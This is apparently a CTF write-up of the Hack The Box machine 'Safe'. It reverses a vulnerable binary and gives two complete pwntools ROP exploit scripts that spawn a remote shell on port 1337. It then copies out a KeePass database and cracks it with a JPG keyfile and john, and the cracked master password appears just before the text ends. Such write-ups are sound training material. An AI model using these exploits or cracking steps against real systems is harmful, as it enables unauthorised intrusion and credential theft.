# Safe - `OSCP style`

Start: 18th November 2022 9:32 PM

End: 20th November 2022 9:38 PM

Setup
```console
$ export IP=10.10.10.147
$ mkdir nmap
```
Added `safe.htb` to `/etc/hosts`.

Initial Recon
```console
$ nmap -A -T5 $IP -vv -oN nmap/initial

[REDACTED]
22/tcp open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))
```


Full Port Scan
```console
$ sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

[REDACTED]
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63
```
Found `waste`(?) on port `1337/tcp`.


Upon visiting the website on port `80`, the default apache page was being shown. In the source code of the page, I saw a comment:
```html
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
```

It hints that there is an application called `myapp` running on port `1337`. So I navigated to `/myapp`, and an executable file named `myapp` was being downloaded.
```console
$ file myapp

myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
```
It is an 64-bit executable for linux, and it is `not stripped`. Since it is `not stripped`, we can run it in a debugger to view its behaviour. I'll be using `gef`.
```console
$ gdb -q ./myapp

GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from ./myapp...
(No debugging symbols found in ./myapp)
gef➤  
```

## Overview of `myapp`

Before we continue, you can refer to [this website](https://web.stanford.edu/class/archive/cs/cs107/cs107.1166/guide_x86-64.html) to have a better view of what each registers do.

First, checking the attributes of the executable.
```console
$ checksec --file=./myapp                                                                                                                                                                  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   65 Symbols        No    0               2               ./myapp
```
`NX` is enabled, which means we cannot execute shell code.

Next, viewing the functions. Most of them are functions from imported library, but there is 1 function that caught my attention - `test`.
```console
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  printf@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  test                 <-- Here
0x000000000040115f  main
0x00000000004011b0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401214  _fini
```

Before we look into the `test` function, let's take a look at `main`.
```console
gef➤  disas main

Dump of assembler code for function main:
   0x000000000040115f <+0>:     push   rbp
   0x0000000000401160 <+1>:     mov    rbp,rsp
   0x0000000000401163 <+4>:     sub    rsp,0x70
   0x0000000000401167 <+8>:     lea    rdi,[rip+0xe9a]        # 0x402008
   0x000000000040116e <+15>:    call   0x401040 <system@plt>
   0x0000000000401173 <+20>:    lea    rdi,[rip+0xe9e]        # 0x402018
   0x000000000040117a <+27>:    mov    eax,0x0
   0x000000000040117f <+32>:    call   0x401050 <printf@plt>
   0x0000000000401184 <+37>:    lea    rax,[rbp-0x70]
   0x0000000000401188 <+41>:    mov    esi,0x3e8
   0x000000000040118d <+46>:    mov    rdi,rax
   0x0000000000401190 <+49>:    mov    eax,0x0
   0x0000000000401195 <+54>:    call   0x401060 <gets@plt>
   0x000000000040119a <+59>:    lea    rax,[rbp-0x70]
   0x000000000040119e <+63>:    mov    rdi,rax
   0x00000000004011a1 <+66>:    call   0x401030 <puts@plt>
   0x00000000004011a6 <+71>:    mov    eax,0x0
   0x00000000004011ab <+76>:    leave  
   0x00000000004011ac <+77>:    ret    
End of assembler dump.
```

Looks like the `test` function wasn't being called at all. Now let's look into `test`.
```console
gef➤  disas test
Dump of assembler code for function test:
   0x0000000000401152 <+0>:     push   rbp
   0x0000000000401153 <+1>:     mov    rbp,rsp
   0x0000000000401156 <+4>:     mov    rdi,rsp      <-- Here
   0x0000000000401159 <+7>:     jmp    r13          <-- Here
   0x000000000040115c <+10>:    nop
   0x000000000040115d <+11>:    pop    rbp
   0x000000000040115e <+12>:    ret    
End of assembler dump.
```
Take note of line `+4` and `+7`, `rdi` is to store the `1st argument` of a called function. If we are able to take control over `rsp`, we will be able to take control of the `1st argument` of the next called function. Next, with the `jmp` instruction, we will be able to jump to any desired location.

Without further ado, let's try to fill in some junk data to see on which offset it causes a segmentation fault.

Creating a pattern:
```console
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
[+] Saved as '$_gef0'
```

Running the executable and supplying the input:
```console
gef➤  run
Starting program: /home/ryz3n/HTB/oscp-machines/safe/myapp 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching after vfork from child process 9979]
 03:22:55 up 36 min,  2 users,  load average: 0.20, 0.22, 0.25

What do you want me to echo back? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011ac in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x007fffffffdf08  →  "yaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfa[...]"
$rcx   : 0x007ffff7ec30d0  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffddf8  →  "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"
$rbp   : 0x616161616161616f ("oaaaaaaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9fa10  →  0x0000000000000000
$rip   : 0x000000004011ac  →  <main+77> ret 
$r8    : 0x00000000405660  →  "uaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafba[...]"
$r9    : 0x007ffff7f39580  →  <__memmove_ssse3+320> movaps xmm1, XMMWORD PTR [rsi+0x10]
$r10   : 0x007ffff7dd4fd8  →  0x10002200006647 ("Gf"?)
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdf18  →  "baaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaacha[...]"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffddf8│+0x0000: "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"      ← $rsp
0x007fffffffde00│+0x0008: "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]"
0x007fffffffde08│+0x0010: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
0x007fffffffde10│+0x0018: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
0x007fffffffde18│+0x0020: "taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaaza[...]"
0x007fffffffde20│+0x0028: "uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabba[...]"
0x007fffffffde28│+0x0030: "vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabca[...]"
0x007fffffffde30│+0x0038: "waaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4011a1 <main+66>        call   0x401030 <puts@plt>
     0x4011a6 <main+71>        mov    eax, 0x0
     0x4011ab <main+76>        leave  
 →   0x4011ac <main+77>        ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "myapp", stopped 0x4011ac in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4011ac → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

From here we can see that it caused a `Segmentation Fault`. We have overwritten the following registers: `rbx`, `rsp`, `r8`, `r13`.

However, with 1024 bytes of data, we are still not able to overwrite the `rip` (Instruction Pointer). Since we can control `rsp`, we can take advantage of the `ret` instruction in `main` to return to another address. Why? ***[read here](https://www.quora.com/What-does-RET-instruction-do-in-assembly-language)***.
> The RET instruction pops the return address off the stack (which is pointed to by the stack pointer register) and then continues execution at that address.

At this point, I came up with 2 methods of exploiting the executable:

Before we start exploiting, let's calculate for the offset of `rsp`.
```console
gef➤  pattern offset paaaaaaaq

[+] Searching for 'paaaaaaaq'
[+] Found at offset 120 (big-endian search)
```
So, 120 bytes of junk until we reach `rsp`, then followed by `8 bytes` per chunk.

### Method 1

Steps:
1. Pop `rdi`.
2. Point `rdi` to a writable memory area.
3. Call `gets` function, then we supply our desired command.
4. Pop `rdi` again.
5. Point `rdi` to the previously written memory address at step 2.
6. Call `system` function to execute the command.

First, we need to find a way to control `rdi`. Since there are no instructions in the `main` or `test` function that pops `rdi`. We have to find it manually, I'll be using `ropper`:
```console
$ ropper --file ./myapp --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./myapp
0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040120b: pop rdi; ret;

```
From the results of ropper, it shows that theres an instruction that pops `rdi`, then calls `ret` at the address `0x40120b`.

This method requires us to direct `rdi` to a `read/write allowed` memory address. I'll be using `radare2` to find them out:
```console
$ radare2 ./myapp
[0x00401070]> iS
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 
1   0x000002a8   0x1c 0x004002a8   0x1c -r-- .interp
2   0x000002c4   0x20 0x004002c4   0x20 -r-- .note.ABI-tag
3   0x000002e4   0x24 0x004002e4   0x24 -r-- .note.gnu.build-id
4   0x00000308   0x1c 0x00400308   0x1c -r-- .gnu.hash
5   0x00000328   0xa8 0x00400328   0xa8 -r-- .dynsym
6   0x000003d0   0x50 0x004003d0   0x50 -r-- .dynstr
7   0x00000420    0xe 0x00400420    0xe -r-- .gnu.version
8   0x00000430   0x20 0x00400430   0x20 -r-- .gnu.version_r
9   0x00000450   0x30 0x00400450   0x30 -r-- .rela.dyn                                                                                                                                       
10  0x00000480   0x60 0x00400480   0x60 -r-- .rela.plt                                                                                                                                       
11  0x00001000   0x17 0x00401000   0x17 -r-x .init
12  0x00001020   0x50 0x00401020   0x50 -r-x .plt
13  0x00001070  0x1a1 0x00401070  0x1a1 -r-x .text
14  0x00001214    0x9 0x00401214    0x9 -r-x .fini
15  0x00002000   0x3c 0x00402000   0x3c -r-- .rodata
16  0x0000203c   0x44 0x0040203c   0x44 -r-- .eh_frame_hdr
17  0x00002080  0x120 0x00402080  0x120 -r-- .eh_frame
18  0x00002e10    0x8 0x00403e10    0x8 -rw- .init_array           <-- Here
19  0x00002e18    0x8 0x00403e18    0x8 -rw- .fini_array           <-- Here
20  0x00002e20  0x1d0 0x00403e20  0x1d0 -rw- .dynamic              <-- Here
21  0x00002ff0   0x10 0x00403ff0   0x10 -rw- .got                  <-- Here
22  0x00003000   0x38 0x00404000   0x38 -rw- .got.plt              <-- Here
23  0x00003038   0x10 0x00404038   0x10 -rw- .data                 <-- Here
24  0x00003048    0x0 0x00404048    0x8 -rw- .bss                  <-- Here
25  0x00003048   0x1c 0x00000000   0x1c ---- .comment
26  0x00003068  0x618 0x00000000  0x618 ---- .symtab
27  0x00003680  0x20b 0x00000000  0x20b ---- .strtab
28  0x0000388b  0x103 0x00000000  0x103 ---- .shstrtab


[0x00401070]> 
```

Any location with the `rw` flag can be used, I'll be using `.got.plt` at `0x00404000`.

Here's the python script (`exploit.py`) I've written to exploit:
```python
#!/usr/bin/env python3 

from pwn import *

junk = b"A" * 120

pop_rdi = p64(0x40120b) # 0x000000000040120b: pop rdi; ret; 

data_addr = p64(0x00404000) # found using radare2

gets_addr = p64(0x401060) # <+54>:    call   0x401060 <gets@plt>

system_addr = p64(0x401040) # <+15>:    call   0x401040 <system@plt>

payload = b"".join([
	junk,
	pop_rdi, data_addr, gets_addr,
	pop_rdi, data_addr, system_addr
	])

p = process("./myapp")
p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
```
To summarize what the code does:

First, it overflows the buffer with 120 bytes of junk data until we reach `rsp`. Then we write the remaining value of `rsp` to the following addresses. Here is the value of `rsp` when we hit a breakpoint at `*main+77`:
```console
gef➤  x/48xb $rsp

0x7fffffffddf8: 0x0b    0x12    0x40    0x00    0x00    0x00    0x00    0x00   <-- pop_rdi     [1]
0x7fffffffde00: 0x00    0x40    0x40    0x00    0x00    0x00    0x00    0x00   <-- data_addr   [2]
0x7fffffffde08: 0x60    0x10    0x40    0x00    0x00    0x00    0x00    0x00   <-- gets_addr   [3]
0x7fffffffde10: 0x0b    0x12    0x40    0x00    0x00    0x00    0x00    0x00   <-- pop_rdi     [4]
0x7fffffffde18: 0x00    0x40    0x40    0x00    0x00    0x00    0x00    0x00   <-- data_addr   [5]
0x7fffffffde20: 0x40    0x10    0x40    0x00    0x00    0x00    0x00    0x00   <-- system_addr [6]
```
Each time the program finishes an instruction and calls `ret`, it will jump to what `rsp` is pointing then pops it off, so the code flow will be:
1. Continues at the address `0x40120b` where the instructions are `pop rdi; ret;`.
2. After executing `pop rdi`, the value of `rdi` will be overwritten with `0x00404000`, which is where we want the `gets` function to store data at.
3. Calls the `gets` function to prompt for our input, which will be `/bin/sh` to access a shell.
4. After the `ret` in `gets@plt` , continues at the address `0x40120b` where the instructions are `pop rdi; ret;`.
5. Same as [2], but this time is to point to what we want the `system` function executes.
6. Calls the `system` function to execute the system command.

So let's run the code:
```console
$ ./exploit.py                                                                                                                                                                             
[+] Starting local process './myapp': pid 29426
/home/ryz3n/HTB/oscp-machines/safe/./exploit.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("/bin/sh")
[*] Switching to interactive mode
 04:50:57 up  1:55,  2 users,  load average: 0.40, 0.31, 0.28

What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0b@
$ whoami
ryz3n
$ id
uid=1001(ryz3n) gid=1001(ryz3n) groups=1001(ryz3n),27(sudo),33(www-data)
$  
```
Yes we have shell now. Next is to send the payload through port `1337`. To do that, modify `exploit.py` with:
```python
[REDACTED]

# p = process("./myapp")
p = remote("10.10.10.147", "1337")

p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
```

Executing the script:
```console
$ ./exploit.py                                                                                                                                                                             
[+] Opening connection to 10.10.10.147 on port 1337: Done
/home/ryz3n/HTB/oscp-machines/safe/./exploit.py:32: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("/bin/sh")
[*] Switching to interactive mode
 04:52:16 up 15:45,  0 users,  load average: 0.00, 0.00, 0.00
$ whoami
user
$ hostname
safe
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
$  
```

## Method 2

Steps:
1. Pop `r13`
2. Point `r13` to `system@plt`
3. Change code flow to `*test+4` by abusing `ret` at `main`.
```console
gef➤  disas test
Dump of assembler code for function test:
   0x0000000000401152 <+0>:     push   rbp
   0x0000000000401153 <+1>:     mov    rbp,rsp
   0x0000000000401156 <+4>:     mov    rdi,rsp      <-- Here
   0x0000000000401159 <+7>:     jmp    r13          
   0x000000000040115c <+10>:    nop
   0x000000000040115d <+11>:    pop    rbp
   0x000000000040115e <+12>:    ret    
End of assembler dump.
```
4. Control the value of `rdi` by overwritting `rsp`. We will insert it with our desired command, which is `/bin/sh`.
5. On the next instruction, `jmp r13`, it will go to `system@plt`, executing with `rdi` as the argument for the function.

This method requires the use of some instructions in the `test` function. 

First, We will overwrite `rsp` to let the `ret` call to change the code flow to pop `rdi`.

As mentioned above, we have to pop `r13`, so let's search for instructions within the executable file:
```console
$ ropper --file ./myapp --search "pop r13"                                                                                                                                                 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r13

[INFO] File: ./myapp
0x0000000000401206: pop r13; pop r14; pop r15; ret;
```

As you can see, at `0x401206`, the instruction is `pop r13; pop r14; pop r15; ret;`. We cannot pop `r13` individually because there are `pop r14` and `pop r15` until `ret`. So we have to fill in junk data for `r14` and `r15`.

Here's a python script (`exploit2.py`) I've written to exploit:
```python
#!/usr/bin/env python3

from pwn import *

junk = b"A" * 120

pop_r13_r14_r15 = p64(0x401206)

# 0x401206: pop r13; pop r14; pop r15; ret;

r13 = p64(0x401040) # main<+15>:    call   0x401040 <system@plt>

r14 = b"B" * 8 # Junk

r15 = b"C" * 8 # Junk

# Next code flow by controlling $rsp

next_instruction = p64(0x401156) # ret using this $rsp value!

# test<+4>:     mov    rdi,rsp

# Now we need to overwrite remaining $rsp to make in to mov into $rdi

rsp_to_rdi = b"/bin/sh"  # The command!

# Next instruction - test<+7>:     jmp    r13
# It will jump to system@plt to execute "/bin/sh"

payload = b"".join([
	junk,
	pop_r13_r14_r15,
	r13,
	r14,
	r15,
	next_instruction,
	rsp_to_rdi,
	b"\x00"
	])

# p = process("./myapp")
p = remote("10.10.10.147", "1337")
p.sendline(payload)
p.interactive()
```
To summarize what the code does:

First, it overflows the buffer with 120 bytes of junk data until we reach `rsp`. Then we write the remaining value of `rsp` to the following addresses. Here is the value of `rsp` when we hit a breakpoint at `*main+77`:
```console
gef➤  x/48xb $rsp

0x7fffffffde18: 0x06    0x12    0x40    0x00    0x00    0x00    0x00    0x00   <--pop_r13_r14_r15  [1]
0x7fffffffde20: 0x40    0x10    0x40    0x00    0x00    0x00    0x00    0x00   <--r13              [2]
0x7fffffffde28: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42   <--r14              [3]
0x7fffffffde30: 0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43   <--r15              [4]
0x7fffffffde38: 0x56    0x11    0x40    0x00    0x00    0x00    0x00    0x00   <--next_instruction [5]
0x7fffffffde40: 0x2f    0x62    0x69    0x6e    0x2f    0x73    0x68    0x00   <--rsp_to_rdi       [6]
```
Each time the program finishes an instruction and calls ret, it will jump to what rsp is pointing then pops it off, so the code flow will be:
1. Continues at the address `0x401206`, where the instructions are `pop r13; pop r14; pop r15; ret;`.
2. `r13` will be written with the address of `system@plt`, which is `0x401040`.
3. `r14` will be written with junk data `BBBBBBBB`.
4. `r15` will be written with junk data `CCCCCCCC`.
5. The next instruction points to `0x401156`, which is `test<+4>: mov rdi,rsp`.
6. This will be the value of the remaining `rsp` which will be copied to `rdi` by the instructions mentioned in [5].

Executing the script:
```console
$ ./exploit2.py
         
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
 08:31:40 up 19:24,  1 user,  load average: 0.00, 0.00, 0.00
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
$ whoami
user
$  
```

---
### We are in as `user@safe`.

The ***user flag*** can be found at `/home/user/user.txt`.

At this point, I've [generated SSH Keys](../Tips%26Tricks/Generating%20SSH%20Keys.md) to have a more stabilized shell.

## `user` to `root`

After landing at `/home/user`, there are several files that caught my attention:
```console
user@safe:~$ ls -l
total 11264
drwxr-xr-x 2 user user    4096 Nov 20 06:39 images
-rw-r--r-- 1 user user 1907614 May 13  2019 IMG_0545.JPG     <--
-rw-r--r-- 1 user user 1916770 May 13  2019 IMG_0546.JPG     <--
-rw-r--r-- 1 user user 2529361 May 13  2019 IMG_0547.JPG     <--
-rw-r--r-- 1 user user 2926644 May 13  2019 IMG_0548.JPG     <--
-rw-r--r-- 1 user user 1125421 May 13  2019 IMG_0552.JPG     <--
-rw-r--r-- 1 user user 1085878 May 13  2019 IMG_0553.JPG     <--
-rwxr-xr-x 1 user user   16592 May 13  2019 myapp
-rw-r--r-- 1 user user    2446 May 13  2019 MyPasswords.kdbx     <--
-rw------- 1 user user      33 Nov 19 13:07 user.txt
user@safe:~$ 
```

`MyPasswords.kdbx` is definitely a `KeePass` database, which stores different kinds of passwords managed by a **master password**. From my previous experience, Keepass is only vulnerable to dictionary attacks prior version 4.0, because `keepass2john` can only extract hashes from those versions.

```console
user@safe:~$ file MyPasswords.kdbx 

MyPasswords.kdbx: Keepass password database 2.x KDBX
```

It is version `2.X`, we can try using it in `keepass2john`.

This box doesn't have `netcat` in it, so I copied to file using a manual way:
```console
user@safe:~$ cat MyPasswords.kdbx | base64

[REDACTED](it's too long to show it here)
```
Then I copied it and type the following in my box:
```console
$ echo "(paste here)" | base64 -d > MyPasswords.kdbx
$ file MyPasswords.kdbx 

MyPasswords.kdbx: Keepass password database 2.x KDBX
```

Next, I converted the file into a john readable file
```console
$ keepass2john MyPasswords.kdbx > forjohn
```

Until here, I've tried bruteforcing it using `rockyou.txt` but it doesn't seems to work.

Then I noticed that `keepass2john` accepts arguments:
```console
$ keepass2john 

Usage: keepass2john [-k <keyfile>] <.kdbx database(s)>
```

But where do I get the keys? I've tried running `linpeas` on the box, but I've found nothing.

Then after several hours of struggling, I saw [this thread](https://superuser.com/questions/1355411/keepass-key-file-format#:~:text=File%20Type%20and%20Existing%20Files,DOC%20document%2C%20etc.). It says:
> File Type and Existing Files. KeePass can generate key files for you, however you can also use any other, already existing file (like JPG image, DOC document, etc.).

I immediately remembered there were multiple `.JPG` files at `/home/user/`. The image data is too big to be shown on screen to copy, so I found another way to transfer to files - `scp`. On my box:
```
$ mkdir images
$ scp -i id_rsa_user user@safe.htb:/home/user/IMG_0545.JPG images/
$ scp -i id_rsa_user user@safe.htb:/home/user/IMG_0546.JPG images/
$ scp -i id_rsa_user user@safe.htb:/home/user/IMG_0547.JPG images/
$ scp -i id_rsa_user user@safe.htb:/home/user/IMG_0548.JPG images/
$ scp -i id_rsa_user user@safe.htb:/home/user/IMG_0552.JPG images/
$ scp -i id_rsa_user user@safe.htb:/home/user/IMG_0553.JPG images/
```

Then I use each of them to generate a file for john to crack.
```console
$ keepass2john -k images/IMG_0545.JPG MyPasswords.kdbx > forjohn45
$ keepass2john -k images/IMG_0546.JPG MyPasswords.kdbx > forjohn46
$ keepass2john -k images/IMG_0547.JPG MyPasswords.kdbx > forjohn47
$ keepass2john -k images/IMG_0548.JPG MyPasswords.kdbx > forjohn48
$ keepass2john -k images/IMG_0552.JPG MyPasswords.kdbx > forjohn52
$ keepass2john -k images/IMG_0553.JPG MyPasswords.kdbx > forjohn53
```

Then after trial and error, I finally get the right file, it was `IMG_0547.JPG`.
```console
$ john forjohn47 -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bullshit         (MyPasswords)     
